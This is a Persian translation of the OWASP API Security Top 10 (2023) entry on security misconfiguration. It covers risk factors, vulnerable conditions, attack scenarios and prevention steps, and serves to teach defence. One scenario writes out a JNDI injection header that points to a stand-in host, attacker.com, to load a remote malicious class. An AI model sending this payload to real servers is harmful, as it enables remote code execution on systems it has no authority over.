<div dir="rtl" align='right'>

# API8:2023 پیکربندی امنیتی نادرست
---


| ضعف امنیتی | عوامل تهدید / مسیر حمله | پیامد |
|---------|--------------------|------------|
| خاص API / قابلیت بهره‌برداری: آسان |  میزان شیوع: گسترده/ قابلیت تشخیص: آسان              | پیامد فنی: متوسط / خاص کسب و کار
| مهاجمین غالبا در تلاش برای یافتن حفره‌های وصله نشده، توابع رایج یا فایل‌ها و مسیرهای محافظت نشده به منظور دسترسی غیرمجاز به سیستم هستند. اطلاعات و تکنیک‌های مرتبط با این مسائل به طور عمومی در دسترس بوده و احتمال وقوع حمله در مورد آنها وجود دارد.              | پیکربندی امنیتی نادرست می‌تواند در هر سطحی از API، از سطح شبکه تا سطح اپلیکشن روی دهد. ابزارهای خودکاری وجود دارند که فرایند تشخیص و بهره برداری از پیکربندی‌های نادرست نظیر تشخیص سرویس‌های غیرضروری را انجام می‌دهند.     | پیکربندی امنیتی نادرست نه تنها می‌تواند اطلاعات حساس کاربر را افشا کند بلکه جزئیاتی از سیستم که ممکن است به از دست رفتن کامل سرور منجر شود را نیز در معرض خطر قرار می‌دهد.         |


### آیا API از نظر پیکربندی امنیتی نادرست[^1] ‌‌‌آسیب‌پذیر است؟
---
API از منظر پیکربندی امنیتی نادرست ‌‌‌آسیب‌پذیر است اگر:

- ایمن سازی امنیتی مناسب[^2] در هر قسمت از پشته اپلیکیشن رعایت نشده یا اپلیکیشن مجوزهای با پیکربندی نادرست روی سرویس‌‌‌‌های ابری داشته باشد.
- جدیدترین وصله‌‌‌‌های امنیتی نصب نشده و سیستم‌‌‌‌ها کاملا بروز نباشند.
- ویژگی غیرضروری (نظیر Verb اضافی HTTP) فعال باشند.
- تفاوت‌هایی در نحوه پردازش درخواست‌های ورودی توسط سرورها در زنجیره سرور HTTP وجود داشته باشد.
- امنیت لایه انتقال (TLS) غیرفعال باشد.
- دستورات و الزامات امنیتی (نظیر  <LINK> سرایندهای امنیتی) به سوی کلاینت ارسال نشوند.
- خط مشی اشتراک متقابل منابع (CORS[^3]) وجود نداشته یا به درستی ‌پیاده‌سازی نشده باشد.
- پیام‌‌‌‌های خطا ردپای پشته[^4] یا اطلاعات حساس دیگر را افشا نمایند.

### مثال‌‌‌‌هایی از سناریوهای حمله
---
#### سناریو #1

سروری از API یک نرم‌افزار ثبت دسترسی معتبر و متن‌باز با قابلیت توسعه و پشتیبانی از جستجوهای JNDI (واسطه نام‌گذاری و دایرکتوری جاوا) برای ثبت درخواست‌ها و دسترسی‌ها استفاده می‌کند. برای هر درخواست جدید، یک ورودی جدید با الگوی زیر ثبت می‌شود:

</div>

```http
<method> <api_version>/<path> - <status_code>
```
<div dir="rtl" align='right'>

یک عامل مخرب، درخواست API مشخصی را ارسال می‌کند که در فایل گزارش دسترسی نوشته می‌شود:
</div>


```http
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```
<div dir="rtl" align='right'>

اگر مهاجم از یک سرور کنترل از راه دور برای اجرای یک کد مخرب با نام Malicious.class استفاده کرده و این کد را در سرآیند درخواست X-Api-Version قرار دهد، نرم‌افزار گزارش‌دهی، به دلیل تنظیمات پیش‌فرض ناامن خود، این کد مخرب را از سرور مهاجم دانلود کرده و اجرا می‌کند.
</div>
<div dir="rtl" align='right'>

#### سناریو #2

یک وب‌سایت شبکه‌ی اجتماعی امکان ارسال "پیام مستقیم" را فراهم کرده که به کاربران امکان برقراری گفت‌وگوی خصوصی را می‌دهد. برای دریافت پیام‌های جدید در یک گفت‌وگو خاص، وب‌سایت درخواست API زیر را ارسال می‌کند (نیازی به تعامل کاربری نیست):
</div>

```http
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```
<div dir="rtl" align='right'>

پاسخ API شامل هدر پاسخ HTTP Cache-Control نمی‌شود، به همین علت گفت‌وگوهای خصوصی در مرورگر وب ذخیره شده و به مهاجمان اجازه می‌دهد که آنها را از فایل‌های حافظه نهان مرورگر در فایل‌سیستم بازیابی کنند.

### چگونه از ‌‌‌آسیب‌پذیری پیکربندی امنیتی نادرست پیشگیری کنیم؟
---
چرخه حیات API بایستی شامل موارد زیر باشد:

- فرایندی تکرار شونده برای ایمن سازی API که منجر به ‌پیاده‌سازی سریع و آسان یک محیط ایمن شود.
- فرایندی برای بازبینی و بروزرسانی پیکربندی‌‌‌‌ها در سراسر پشته API؛ این بازبینی بایستی موارد از جمله بازبینی هماهنگی بین فایل‌‌‌‌ها، مولفه‌‌‌‌های API و سرویس‌‌‌‌های ابری (نظیر مجوزهای باکت‌‌‌‌های S3) را دربرگیرد.
- فرایندی خودکار جهت ارزیابی پیوسته و مداوم اثربخشی پیکربندی و تنظیمات اعمال شده در سراسر محیط API و اپلیکیشن.

بعلاوه:

- حصول اطمینان از این که تمام ارتباطات API از سمت مشتری به سرور و هر کارکردهای دیگر روی یک کانال ارتباطی رمزنگاری شده (TLS) انجام می‌شود؛ بدون توجه به اینکه آیا این API داخلی است یا به صورت عمومی منتشر شده است.
- حصول اطمینان از اینکه API فقط به افعال HTTP مدنظر توسعه دهنده پاسخ می دهد و غیرفعال کردن سایر افعال (نظیر HEAD).
- APIهایی که انتظار می‌رود دسترسی به آنها از طریق کلاینت‌‌‌‌های مبتنی بر مرورگر (مثلا فرانت WebApp) باشد:
  - بایستی خط مشی CORS مناسب را بکار گیرند.
  - شامل سرآیندهای امنیتی قابل اجرا باشند.
  - محتوا و فرمت‌ داده‌های ورودی را طوری محدود کنید که با نیازها و عملکرد کسب‌وکار سازگار باشند.
- برای جلوگیری از مشکلات عدم هماهنگی، مطمئن شوید که تمام سرورها در زنجیره سرورهای HTTP (مانند توازن بار[^5]، پروکسی‌های معکوس و پیشرو[^6] و back-end) درخواست‌های ورودی را به شیوه‌ای یکنواخت پردازش می‌کنند.
- در موارد قابل اجرا، تمام طرح‌های بارگیری پاسخ API تعریف و اعمال شود، از جمله پاسخ‌های خطا، تا از ارسال جزئیات اشتباه و اطلاعات مهم به مهاجمان جلوگیری گردد.
- برای همه پاسخ‌هایی که از API دریافت می‌شود، حتی پاسخ‌های شامل پیغام خطا، یک نقشه ساختاری دقیق تعریف شود. این اقدام باعث می‌شود که جزئیات خطاها و سایر اطلاعات حساس به مهاجمان ارسال نشود.

## مراجع
</div>
---

- [OWASP](https://owasp.org/)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [Configuration and Deployment Management Testing - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Testing for Error Handling - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Testing for Cross Site Request Forgery - Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
<div dir="rtl" align='right'>

#### خارجی
</div>

- [CWE-2: Environmental Security Flaws](https://cwe.mitre.org/data/definitions/2.html)
- [CWE-16: Configuration](https://cwe.mitre.org/data/definitions/16.html)
- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)
- [CWE-388: Error Handling](https://cwe.mitre.org/data/definitions/388.html)
- [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')](https://cwe.mitre.org/data/definitions/444.html)
- [CWE-942: Permissive Cross-domain Policy with Untrusted Domains](https://cwe.mitre.org/data/definitions/942.html)
- [Guide to General Server Security NIST](https://csrc.nist.gov/publications/detail/sp/800-123/final)
- [Let's Encrypt: a free automated and open Certificate Authority](https://letsencrypt.org/)


[^1]: Security Misconfiguration
[^2]: Hardening
[^3]: Cross-Origin Resource Sharing
[^4]: Stack Trace
[^5]: load balancers
[^6]: reverse and forward proxies

  

